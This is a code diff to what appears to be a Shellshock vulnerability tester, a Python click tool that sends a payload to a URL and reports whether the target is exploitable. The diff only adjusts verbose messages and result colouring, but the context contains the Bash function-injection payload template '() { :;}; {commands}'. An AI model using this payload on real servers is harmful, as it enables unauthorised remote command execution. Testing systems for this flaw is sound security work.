@@ -22,10 +22,17 @@ def test_site(url, verbose, commands, payload):
   """
   click.echo("Testing {url} with a standard payload using ShellShocker".format(url=url))
 
+
   if verbose:
     click.echo("Creating instance of exploit on {url}".format(url=url))
-    click.echo("Using commands {commands}".format(commands=commands))
-    click.echo("Using the {payload} payload".format(payload=payload))
+    if commands is not None:
+      click.echo("Using commands {commands}".format(commands=commands))
+    else:
+      click.echo("Using default commands")
+    if payload is not None:
+      click.echo("Using the {payload} payload".format(payload=payload))
+    else:
+      click.echo("Using default payload")
 
   if payload == 'traditional':
     payloadstring = '() {{ :;}}; {commands}'
@@ -35,7 +42,10 @@ def test_site(url, verbose, commands, payload):
     payloadstring = '() {{ :;}}; {commands}'
 
   # Create a instance of the exploiter
-  shocker = ShellShocker({'url': url, 'commands': commands, 'payload': payloadstring, 'verbosity': verbose})
+  shocker = ShellShocker({'url': url, 'commands': commands, 'payload': payloadstring})
+
+  if verbose:
+    shocker.verbose = True
 
   if verbose:
     click.echo("Sending exploit to {url}".format(url=url))
@@ -43,7 +53,7 @@ def test_site(url, verbose, commands, payload):
   # Is it exploitable?
   exploitable = shocker.exploitable()
 
-  click.echo("{url} is exploitable".format(url=url) if exploitable else "{url} is not exploitable".format(url=url))
+  click.echo(click.style("{url} is exploitable".format(url=url), fg="red") if exploitable else click.style("{url} is not exploitable".format(url=url), fg="green"))
 
 if __name__ == '__main__':
   """
